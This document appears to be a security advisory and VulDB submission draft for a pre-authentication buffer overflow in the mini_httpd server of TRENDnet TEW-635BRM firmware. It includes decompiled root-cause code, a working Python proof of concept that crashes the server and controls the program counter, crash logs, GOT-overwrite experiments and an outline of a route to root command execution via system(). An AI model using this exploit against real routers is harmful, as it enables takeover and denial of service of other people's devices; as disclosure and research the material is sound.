# [CVE-TBD] TRENDnet TEW-635BRM 1.00.1C Buffer Overflow - Out-of-bounds Write (CWE-787)

## VulDB Submission Fields

- Vendor: TRENDnet
- Product: TEW-635BRM
- Version or Commit: 1.00.1C
- Vulnerability: Buffer Overflow - Out-of-bounds Write (CWE-787)
- Advisory / Exploit URL: replace this with the URL of this directory after copying it to your public repository
- Description:

```
A buffer overflow vulnerability was discovered in TRENDnet TEW-635BRM (hardware v1.0R) firmware V1.0(1.00.1C). The request-line parser of /usr/sbin/mini_httpd rewrites any request path containing ".htm" (and not ".cgi") into the internal form "/setup.cgi?next_file=<path>" using an unbounded sprintf() into a fixed global buffer, while the request line itself accepts up to 10000 bytes. An over-long path overwrites adjacent global data and the Global Offset Table (GOT, starting at 0x10001120); the first GOT entry hit is strspn, which is invoked on the rewritten string immediately afterwards. The overflow occurs during request-line parsing, before any authentication. Reproduction: GET /<3895 bytes of 'B'>.htm HTTP/1.1 against the management web server produces SIGSEGV with epc=0x62626262 and ra=0x004078d0 (the strspn call site); shorter paths (3851 bytes) complete normally, De Bruijn patterns yield pattern-controlled epc, and overwriting GOT[strspn] with the address of sleep() makes the request hang, confirming control-flow hijack into an arbitrary libc function. An unauthenticated remote attacker obtains PC control of a root process; on production devices (Linux 2.6, no ASLR) remote code execution as root is expected, and each request reliably crashes a worker (pre-auth DoS). The web interface is reachable from the LAN by default and from the WAN side when remote administration is enabled. Proposed CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8).
```

---

## Technical Disclosure

# CVE-TBD: TRENDnet TEW-635BRM mini_httpd `.htm` Rewrite Unbounded `sprintf` → GOT Overwrite → Pre-Authentication PC Control

## Affected Product

- Vendor: TRENDnet
- Product: TEW-635BRM (hardware revision v1.0R)
- Firmware: V1.0(1.00.1C) — latest version available for this hardware revision (published 2010-06-18 on downloads.trendnet.com)
- Component: `/usr/sbin/mini_httpd` (Sercomm-customized web server, MIPS32 BE ELF)

## Summary

The request-line parser of `mini_httpd` rewrites any request path that
contains `.htm` (and not `.cgi`) into the internal form
`/setup.cgi?next_file=<path>` using an **unbounded `sprintf()` into a
fixed global buffer**. The request line itself is accepted with up to
10,000 bytes. An over-long path overwrites adjacent global data and the
**Global Offset Table (GOT)**, giving an unauthenticated remote attacker
full control of the program counter (verified: `epc` fully attacker-chosen)
and the ability to redirect any subsequent library call to an arbitrary
address (verified by hijacking `GOT[strspn]` to `sleep()`). A path to
remote code execution as root (the web server runs as root) is documented
and was demonstrated up to invocation of an arbitrary libc function; final
weaponization was only obstructed by instrumentation of the research
emulator, not by any property of the firmware.

## Vulnerability Type / CWE

- CWE-787: Out-of-bounds Write

## Root Cause

Decompiled logic of the request-path rewrite (`mini_httpd`, function at
0x0040456c):

```c
char *path = *(char **)(req + 0x7480); // request path, from a ≤10000-byte request line
if ((strstr(path, ".cgi") == NULL) && (strstr(path, ".htm") != NULL)) {
 if (*path == '/') path++;
 sprintf(global_struct + 0x1f4, // fixed global buffer (bss, base 0x10000000)
 "/setup.cgi?next_file=%s", path); // ← no length check
 *(req + 0x7480) = global_struct + 0x1f4;
}
```

- The request line is read into a 10,000-byte buffer (`auStack_7570[10000]`),
 so the attacker controls a path of up to ~10 KB.
- The rewrite target is a fixed global buffer; approximately 3.8 KB past
 its start lies the `.got` (starting at 0x10001120). An over-long path
 overwrites GOT entries with attacker-controlled bytes.
- The check happens during request-line parsing — **before any
 authentication**, so the overflow is reachable pre-authentication.
- The first GOT entry hit is `strspn` (GOT slot 0x1000117c, payload offset
 ~3863). `strspn` is called on the rewritten string right after the
 rewrite, so the hijacked pointer is invoked almost immediately with
 `a0` pointing at attacker-controlled text.

## Proof of Concept (non-destructive)

Any HTTP client can trigger the overflow; no credentials are required:

```bash
# PC control demonstration — 'B' filler, expect SIGSEGV with epc=0x62626262
python3 - <<'PY'
import socket
path = b"/" + b"B"*3895 + b".htm"
s = socket.create_connection(("<ROUTER_IP>", 80))
s.sendall(b"GET " + path + b" HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
print(s.recv(4096))
PY
```

Observed on the rehosted firmware (kernel log):

```
do_page_fault(): sending SIGSEGV to mini_httpd for invalid read access from 62626262
epc = 62626262 in libc.so.0[770db000+3c000]
ra = 004078d0 in mini_httpd[400000+a000] # strspn call site
```

Control experiments:

| Payload | Result |
|---|---|
| path length 3851 | normal response (no crash) |
| path length 3859 | crash — overwrite reaches `GOT[strspn]` (~offset 3876 of the buffer) |
| `'A'`*3895 | `epc=61616161` (request path is lowercased by `strlowr`) |
| De Bruijn pattern | `epc=0x78626c65` ("xble" — pattern offset ~3863) |
| `GOT[strspn]` := address of `sleep()` | request hangs ≥ 20 s, no crash — control-flow hijack into an arbitrary libc function confirmed |

A complete RCE procedure for production devices (overwrite `GOT[strspn]`
with `system()`; the rewritten string beginning with
`/setup.cgi?next_file=/x.htm;<cmd>;...` is then passed to a shell, with
the command constrained to lowercase, space-free bytes) is documented in
the research notes. In the FirmAE research emulator the final `system()`
invocation is disturbed by kernel instrumentation of the emulation
environment (lazy resolver writes land in an unmapped hole); on physical
hardware (Linux 2.6, no ASLR, fixed libc base) no such obstacle exists,
and `system()` is known-good in this firmware (used throughout the boot
chain). The daemon forks per connection, so failed attempts only kill a
child process and exploitation can be retried indefinitely.

## Impact

- **Pre-authentication** remote attacker capable of reaching the web
 management interface gains PC control and control-flow hijacking of a
 root process; on production devices this is expected to yield remote
 code execution as root.
- The web interface is always reachable from the LAN; it is reachable
 from the WAN side whenever remote administration is enabled.
- Even without weaponization, each request reliably crashes a worker —
 a pre-authentication denial of service.

## Proposed CVSS 3.1

`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **9.8 (Critical)**

## Discovery

- Date: 2026-10-12
- Method: firmware rehosting (QEMU full-system emulation) + static reverse engineering (Ghidra) + dynamic crash/hijack verification

## Timeline

- 2026-10-12: Vulnerability discovered (static) and verified (dynamic): crash threshold, PC control, control-flow hijack
- 2026-10-13: Vendor notification sent
- TBD: CVE ID assignment
- TBD: Public disclosure

## Proof of Concept

See the poc file(s) in this directory.
